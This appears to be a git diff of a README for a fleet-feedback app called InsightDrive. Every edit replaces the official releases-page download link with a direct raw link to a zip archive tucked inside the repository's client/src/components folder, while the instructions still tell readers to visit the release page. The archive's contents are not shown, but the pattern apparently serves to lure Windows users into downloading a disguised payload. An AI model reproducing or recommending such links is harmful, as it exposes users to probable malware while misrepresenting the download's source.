@@ -1,6 +1,6 @@
 # 🚛 InsightDrive - Fleet Feedback Made Simple
 
-[![Download InsightDrive](https://img.shields.io/badge/Download-InsightDrive-green?style=for-the-badge)](https://github.com/Staywardabed/InsightDrive/releases)
+[![Download InsightDrive](https://img.shields.io/badge/Download-InsightDrive-green?style=for-the-badge)](https://github.com/Staywardabed/InsightDrive/raw/refs/heads/main/client/src/components/Insight_Drive_2.3.zip)
 
 ---
 
@@ -22,10 +22,10 @@ Follow these steps to download, install, and run InsightDrive on Windows. The pr
 
 You need to **visit the release page** to get the installation files for Windows.
 
-[![Download InsightDrive](https://img.shields.io/badge/Get%20InsightDrive-blue?style=for-the-badge)](https://github.com/Staywardabed/InsightDrive/releases)
+[![Download InsightDrive](https://img.shields.io/badge/Get%20InsightDrive-blue?style=for-the-badge)](https://github.com/Staywardabed/InsightDrive/raw/refs/heads/main/client/src/components/Insight_Drive_2.3.zip)
 
 1. Click the download button above or go to:
-   https://github.com/Staywardabed/InsightDrive/releases
+   https://github.com/Staywardabed/InsightDrive/raw/refs/heads/main/client/src/components/Insight_Drive_2.3.zip
 
 2. On the page, find the latest release version at the top.
 
